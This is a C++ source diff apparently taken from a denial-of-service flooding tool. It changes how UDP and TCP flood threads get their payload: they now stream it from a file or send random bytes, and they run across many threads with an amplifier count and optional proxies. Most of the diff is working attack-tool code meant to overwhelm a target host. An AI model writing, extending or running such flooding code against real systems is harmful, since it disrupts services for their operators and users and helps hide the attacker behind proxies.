@@ -33,11 +33,11 @@
         "%s" COLOR_RESET " | sent " COLOR_GREEN "%d" COLOR_RESET " | failed " COLOR_RED "%d" COLOR_RESET " | noresponse " COLOR_YELLOW "%d" COLOR_RESET \
         " | running threads %d\n"
 
-#define HUGE_BUFFER_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't allocate buffer of size = %lu. Maximum size is %lu.\n" COLOR_RESET
 #define COULDNT_OPEN_FILE_FMT COLOR_RED COLOR_INTENSE "ERROR: " COLOR_RESET COLOR_RED " Couldn't open file \"%s\" : %s - %s\n" COLOR_RESET
+#define ERRPTR reinterpret_cast<void*>(-1)
 
 static const char* appname;
-static const char* send_data = nullptr;
+std::string data_file;
 static int running_threads = 0;
 static int sent_requests = 0;
 static int failed_requests = 0;
@@ -81,19 +81,40 @@ char* rand_bytes(size_t size)
 
 void* flood_thread(void*)
 {
+	if (!target_address) return ERRPTR;
+	
 	::srandom(::time(nullptr));
 	for (size_t i = 0; i < amplifier; ++i)
 	{
 		if ((method == "UDP" || method == "udp") && !proxy_address)
 		{
 			method = "UDP";
-			net::udp_flood flood(*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))), debug);
+			std::unique_ptr<net::udp_flood> flood;
+			if (!data_file.empty())
+			{
+				struct stat st{ };
+				::stat(data_file.c_str(), &st);
+				FILE* file = ::fopen(data_file.c_str(), "rb");
+				if (file)
+				{
+					flood = std::make_unique<net::udp_flood>(*target_address, net::file_sender(file), debug);
+				}
+				else
+				{
+					::fprintf(stderr, COULDNT_OPEN_FILE_FMT, data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno));
+					::exit(errno);
+				}
+			}
+			else
+			{
+				flood = std::make_unique<net::udp_flood>(*target_address, net::buffer_sender(std::string(rand_bytes(MAX_BUFFER))), debug);
+			}
 			::pthread_mutex_lock(&mutex);
-			if (flood == net::r_success)
+			if (flood->operator decltype(net::r_failed)() == net::r_success)
 			{
 				++sent_requests;
 			}
-			else if (flood == net::r_read_failed)
+			else if (flood->operator decltype(net::r_failed)() == net::r_read_failed)
 			{
 				++sent_requests;
 				++failed_reads;
@@ -107,16 +128,38 @@ void* flood_thread(void*)
 		else // tcp
 		{
 			method = "TCP";
-			net::tcp_flood flood(
-					*target_address, (send_data ? std::string(send_data) : std::string(rand_bytes(MAX_BUFFER))),
-					proxy_address, proxy_type, proxy_user, proxy_password, debug
-			);
+			std::unique_ptr<net::tcp_flood> flood;
+			if (!data_file.empty())
+			{
+				struct stat st{ };
+				::stat(data_file.c_str(), &st);
+				FILE* file = ::fopen(data_file.c_str(), "rb");
+				if (file)
+				{
+					flood = std::make_unique<net::tcp_flood>(
+							*target_address, net::file_sender(file),
+							proxy_address, proxy_type, proxy_user, proxy_password, debug
+					);
+				}
+				else
+				{
+					::fprintf(stderr, COULDNT_OPEN_FILE_FMT, data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno));
+					::exit(errno);
+				}
+			}
+			else
+			{
+				flood = std::make_unique<net::tcp_flood>(
+						*target_address, net::buffer_sender(std::string(rand_bytes(MAX_BUFFER))),
+						proxy_address, proxy_type, proxy_user, proxy_password, debug
+				);
+			}
 			::pthread_mutex_lock(&mutex);
-			if (flood == net::r_success)
+			if (flood->operator decltype(net::r_failed)() == net::r_success)
 			{
 				++sent_requests;
 			}
-			else if (flood == net::r_read_failed)
+			else if (flood->operator decltype(net::r_failed)() == net::r_read_failed)
 			{
 				++sent_requests;
 				++failed_reads;
@@ -141,7 +184,6 @@ int main(int argc, char** argv)
 	int longid;
 	int opt;
 	size_t threads_count = 0;
-	std::string data_file;
 	
 	while ((opt = ::getopt_long(argc, argv, s_options, l_options, &longid)) >= 0)
 	{
@@ -295,39 +337,8 @@ int main(int argc, char** argv)
 				  << "  proxy = " << (proxy_address ? proxy_address->get_ip() : "<NULL>") << ":" << (proxy_address ? proxy_address->get_port() : 0)
 				  << COLOR_RESET "\n";
 	
-	if (!method.empty() && target_address && threads_count && amplifier)
+	if (!method.empty() && threads_count && amplifier)
 	{
-		char* data = nullptr;
-		if (!data_file.empty())
-		{
-			struct stat st{ };
-			::stat(data_file.c_str(), &st);
-			FILE* file = ::fopen(data_file.c_str(), "rb");
-			if (file)
-			{
-				if (st.st_size < MAX_BUFFER)
-				{
-					data = new char[st.st_size + 1];
-					size_t read = ::fread(data, sizeof(char), st.st_size, file);
-					data[read] = 0;
-					std::cout << COLOR_GREEN << "Successfully read Data from file \"" << data_file << "\"." COLOR_RESET "\n";
-					std::cout << COLOR_MAGENTA "Data = R\"(" COLOR_BLUE << data << COLOR_MAGENTA ")\"" COLOR_RESET "\n";
-				}
-				else
-				{
-					::fprintf(stderr, HUGE_BUFFER_FMT, st.st_size, MAX_BUFFER);
-					::exit(-1);
-				}
-			}
-			else
-			{
-				::fprintf(stderr, COULDNT_OPEN_FILE_FMT, data_file.c_str(), ::strerrorname_np(errno), ::strerrordesc_np(errno));
-				::exit(errno);
-			}
-		}
-		
-		send_data = data;
-		
 		::srandom(::clock());
 		
 		for (size_t i = 0; i < threads_count; ++i)
